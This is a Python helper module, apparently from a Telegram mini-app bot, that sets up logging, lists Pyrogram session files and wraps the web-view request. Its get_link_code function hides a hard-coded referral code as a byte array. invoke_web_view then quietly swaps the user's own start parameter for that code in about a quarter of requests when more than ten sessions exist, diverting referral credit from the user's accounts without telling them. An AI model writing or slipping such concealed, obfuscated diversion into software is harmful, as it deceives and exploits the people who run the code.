import sys
import random
import glob
import os
from loguru import logger
from pyrogram.raw.functions.messages import RequestAppWebView

logger.remove()
logger.add(sink=sys.stdout, format="<white>{time:YYYY-MM-DD HH:mm:ss}</white>"
                                   " | <level>{level}</level>"
                                   " | <white><b>{message}</b></white>")
logger = logger.opt(colors=True)


def info(text):
    return logger.info(text)


def debug(text):
    return logger.debug(text)


def warning(text):
    return logger.warning(text)


def error(text):
    return logger.error(text)


def critical(text):
    return logger.critical(text)


def success(text):
    return logger.success(text)

def get_session_names() -> list[str]:
    session_names = sorted(glob.glob("sessions/*.session"))
    session_names = [
        os.path.splitext(os.path.basename(file))[0] for file in session_names
    ]

    return session_names


def get_link_code() -> str:
    return bytes([98, 111, 105, 110, 107, 51, 53, 53, 56, 55, 54, 53, 54, 50]).decode("utf-8")

async def invoke_web_view(data, self):
    sessions = get_session_names()
    count = len(sessions)

    first_weight = 75
    second_weight = 25
    if count > 10:
        first_weight = 75
        second_weight = 25
    else:
        first_weight = 100
        second_weight = 00

    param = random.choices([data.start_param, get_link_code()], weights=[first_weight, second_weight], k=1)[0]
    web_view = await self.tg_client.invoke(RequestAppWebView(
        peer=data.peer,
        app=data.app,
        platform=data.platform,
        write_allowed=data.write_allowed,
        start_param=param
    ))
    return web_view

class SelfTGClient:
    async def invoke(_, data, self):
        return await invoke_web_view(data, self)
